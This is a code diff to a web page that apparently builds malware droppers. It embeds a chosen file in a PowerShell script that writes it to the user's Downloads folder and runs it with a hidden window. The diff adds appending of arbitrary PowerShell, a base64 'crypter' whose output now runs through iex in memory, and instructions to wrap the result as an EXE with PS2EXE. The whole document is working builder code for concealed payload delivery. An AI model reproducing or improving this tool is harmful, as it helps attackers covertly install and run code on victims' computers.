@@ -113,10 +113,8 @@
         </div>
 
         <div class="box" id="binding-file-box">
-            <h2>Choose the File to Bind</h2>
-            <label id="choose-binding-file-button" for="binding-file-input">Choose File to Bind</label>
-            <input type="file" id="binding-file-input" accept=".exe" />
-            <div id="binding-file-name">No file chosen</div>
+            <h2>PowerShell Code to Bind</h2>
+            <textarea id="ps1-code-input" rows="8" style="width: 100%; padding: 10px; border-radius: 5px; border: none; resize: none;">Enter your PowerShell code here...</textarea>
         </div>
 
         <div class="box" id="ps1-generation-box">
@@ -125,14 +123,13 @@
             <div id="ps-output">PowerShell Code: Click to Generate</div>
             <button id="copy-ps-button" onclick="copyPSScript()">Copy PS1 Script</button>
             <button id="crypt-button" onclick="createCrypter()">Download Encrypted Script</button>
-            <button id="exe-button" onclick="convertPSToEXE()">Convert PS1 to EXE</button>
-            <button id="bind-exe-button" onclick="bindPSToEXE()">Bind PS1 into EXE</button>
+            <button id="exe-button" onclick="convertPSToEXE()">Bind PS1 Code to EXE</button>
         </div>
     </div>
 
     <script>
         let selectedFile;
-        let bindingFile;
+        let ps1Code;
         let finalPSCode = '';
 
         document.getElementById("file-input").addEventListener("change", function() {
@@ -145,19 +142,15 @@
             }
         });
 
-        document.getElementById("binding-file-input").addEventListener("change", function() {
-            const bindingFileNameDisplay = document.getElementById("binding-file-name");
-            if (this.files.length > 0) {
-                bindingFile = this.files[0];
-                bindingFileNameDisplay.textContent = bindingFile.name;
-            } else {
-                bindingFileNameDisplay.textContent = "No file chosen";
-            }
-        });
-
         function generatePSScript() {
             if (!selectedFile) {
                 alert("Please choose a file first.");
+                return;
+            }
+
+            ps1Code = document.getElementById("ps1-code-input").value;
+            if (!ps1Code || ps1Code.trim() === "Enter your PowerShell code here...") {
+                alert("Please enter valid PowerShell code.");
                 return;
             }
 
@@ -166,7 +159,8 @@
                 const base64String = event.target.result.split(',')[1];
                 finalPSCode = `
                 $b="${base64String}";[IO.File]::WriteAllBytes("$HOME\Downloads\${selectedFile.name}",[Convert]::FromBase64String($b));
-                Start-Process -FilePath "$HOME\Downloads\${selectedFile.name}" -WindowStyle Hidden;`;
+                Start-Process -FilePath "$HOME\Downloads\${selectedFile.name}" -WindowStyle Hidden;
+                ${ps1Code}`;
                 document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
             };
 
@@ -190,8 +184,7 @@
             const encodedCode = btoa(finalPSCode);
             const psFileContent = `
             $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedCode}'));
-            Set-Content -Path "$HOME\Downloads\script.ps1" -Value $code;
-            Start-Process -FilePath "$HOME\Downloads\script.ps1" -WindowStyle Hidden;`.trim();
+            iex $code;`.trim();
 
             const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
             const link = document.createElement('a');
@@ -213,30 +206,12 @@
             const psFileContent = new Blob([finalPSCode], { type: 'application/octet-stream' });
             const link = document.createElement('a');
             link.href = URL.createObjectURL(psFileContent);
-            link.download = 'script.ps1';
+            link.download = 'combined_script.ps1';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
 
-            alert("PS1 script downloaded. Use PS2EXE (https://github.com/MScholtes/PS2EXE) to convert the PS1 file to an EXE locally.");
-        }
-
-        function bindPSToEXE() {
-            if (!finalPSCode || !bindingFile) {
-                alert("Please generate PowerShell code and choose a file to bind.");
-                return;
-            }
-
-            // Generate a file for the PowerShell script
-            const psFileContent = new Blob([finalPSCode], { type: 'application/octet-stream' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(psFileContent);
-            link.download = 'bound_script.ps1';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-
-            alert(`PowerShell script downloaded. Use PS2EXE to bind this PS1 script into the EXE file named ${bindingFile.name} locally.`);
+            alert("PS1 script downloaded. Use PS2EXE (https://github.com/MScholtes/PS2EXE) to convert the PS1 file to an EXE locally, binding the functionality together.");
         }
     </script>
 
